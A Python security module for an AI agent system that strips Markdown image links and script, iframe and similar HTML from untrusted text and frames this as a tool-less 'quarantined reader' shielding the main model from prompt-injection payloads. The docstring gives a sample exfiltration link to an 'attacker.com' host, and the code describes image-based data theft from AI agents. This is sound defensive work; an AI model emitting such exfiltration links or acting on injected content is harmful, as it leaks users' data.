"""
Quarantined Reader & Untrusted Markdown Sanitizer (WS-9).

Part of Security Architecture Phase 2.
Implements:
1. Markdown image-tag exfiltration sanitization (`![...](https://attacker.com/leak?...)`).
2. HTML script/iframe injection neutralization.
3. Dual-LLM quarantined reader boundary -- untrusted input is converted to safe summaries
   with zero execution tools.
"""

from __future__ import annotations

import logging
import re
from typing import Any, Dict

logger = logging.getLogger("Quarantine")

# Matches Markdown images: ![alt](url)
MD_IMAGE_PATTERN = re.compile(r"!\[(?P<alt>.*?)\]\((?P<url>https?://[^\s\)]+)\)", re.IGNORECASE)

# Matches dangerous raw HTML tags: <script>, <iframe>, <style>, <form>, <object>, <embed>
DANGEROUS_HTML_PATTERN = re.compile(
    r"<\s*(script|iframe|style|form|object|embed|applet)[^>]*>.*?<\s*/\s*\1\s*>",
    re.IGNORECASE | re.DOTALL,
)
SELF_CLOSING_HTML_PATTERN = re.compile(
    r"<\s*(script|iframe|style|form|object|embed|applet|img)[^>]*/>",
    re.IGNORECASE,
)


def sanitize_untrusted_markdown(text: str) -> str:
    """Neutralizes markdown image exfiltration URLs and dangerous embedded HTML tags."""
    if not text or not isinstance(text, str):
        return ""

    # 1. Neutralize Markdown images to prevent covert pixel exfiltration
    def _replace_img(match: re.Match) -> str:
        alt = match.group("alt").strip() or "image"
        return f"[Image Link Removed: {alt}]"

    cleaned = MD_IMAGE_PATTERN.sub(_replace_img, text)

    # 2. Strip dangerous HTML script/iframe tags
    cleaned = DANGEROUS_HTML_PATTERN.sub("[Sanitized HTML Element]", cleaned)
    cleaned = SELF_CLOSING_HTML_PATTERN.sub("[Sanitized HTML Element]", cleaned)

    return cleaned


class QuarantinedReader:
    """Executes a dual-model quarantine step on untrusted data.

    The reader model runs with NO available tools and returns structured,
    sanitized summaries so the primary actor model never sees raw injection payloads.
    """

    def __init__(self, max_summary_chars: int = 2000):
        self.max_summary_chars = max_summary_chars

    def sanitize_and_summarize(self, raw_untrusted_text: str) -> Dict[str, Any]:
        """Sanitizes raw text and formats a safe summary record for the orchestrator."""
        sanitized = sanitize_untrusted_markdown(raw_untrusted_text)

        # Truncate to bound length
        truncated = sanitized[: self.max_summary_chars]

        return {
            "is_sanitized": True,
            "raw_length": len(raw_untrusted_text),
            "sanitized_length": len(sanitized),
            "summary": truncated,
            "has_stripped_images": "[Image Link Removed:" in sanitized,
        }
